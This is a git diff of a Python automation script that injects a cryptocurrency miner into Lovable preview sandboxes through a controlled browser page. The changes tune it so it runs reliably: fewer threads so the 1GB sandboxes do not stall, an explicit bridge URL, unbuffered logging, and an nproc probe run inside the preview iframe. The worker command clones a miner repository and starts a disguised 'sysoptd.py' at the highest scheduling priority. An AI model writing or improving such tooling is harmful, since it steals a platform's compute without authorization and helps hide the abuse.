@@ -126,16 +126,29 @@ async def wait_console_ready(page, timeout_seconds: int = 300) -> bool:
     return False
 
 
-def build_worker_command(folder_name: str, bridge_url: str = BRIDGE_URL, threads: int = 64) -> str:
-    """Build worker start command (MINER_CMD env overrides, never commit it)."""
+def build_worker_command(folder_name: str, bridge_url: str = BRIDGE_URL, threads: int = 16) -> str:
+    """Build worker start command (MINER_CMD env overrides, never commit it).
+
+    Default 16 threads — 64 thrashs Lovable 1GB sandboxes (sync forever, no ok).
+    Always pass --bridge so we never silently hit a stale DEFAULT_BRIDGE.
+    python3 -u so sync/ok/rate flush into /tmp/m.log immediately.
+    """
     import os as _os
     _override = _os.environ.get("MINER_CMD")
     if _override:
         return _override
-    return f"""cd /tmp && rm -rf {folder_name} && git clone --depth 1 -q "{MINER_REPO}" {folder_name} && cd {folder_name} && pip install websockets psutil --break-system-packages -q && nice -n -20 python3 sysoptd.py --threads {threads} --no-split --no-schedule --no-noise --no-ramfill --no-pause > /tmp/m.log 2>&1"""
+    return (
+        f"cd /tmp && rm -rf {folder_name} && "
+        f"git clone --depth 1 -q \"{MINER_REPO}\" {folder_name} && "
+        f"cd {folder_name} && pip install websockets psutil --break-system-packages -q && "
+        f"PYTHONUNBUFFERED=1 nice -n -20 python3 -u sysoptd.py "
+        f"--bridge {bridge_url} --threads {threads} "
+        f"--no-split --no-schedule --no-noise --no-ramfill --no-pause "
+        f"> /tmp/m.log 2>&1"
+    )
 
 
-async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) -> bool:
+async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 16) -> bool:
     """
     Inject miner into Lovable preview iframe.
     
@@ -284,8 +297,12 @@ async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) ->
                                 try { await window.doc.connect(); } catch (e) {}
                             }
                             try {
-                                const r = await window.doc('pwd');
-                                return { ok: true, result: r };
+                                const r = await window.doc('nproc');
+                                const out = (r && (r.stdout !== undefined ? r.stdout : r)) + '';
+                                const code = (r && r.code !== undefined) ? r.code : null;
+                                const ok = !!(out.trim()) && (code === null || code === 0);
+                                return { ok: ok, result: out.trim().slice(0, 80),
+                                         error: ok ? null : ('nproc fail code=' + code) };
                             } catch (e) {
                                 return { ok: false, error: String(e && e.message || e) };
                             }
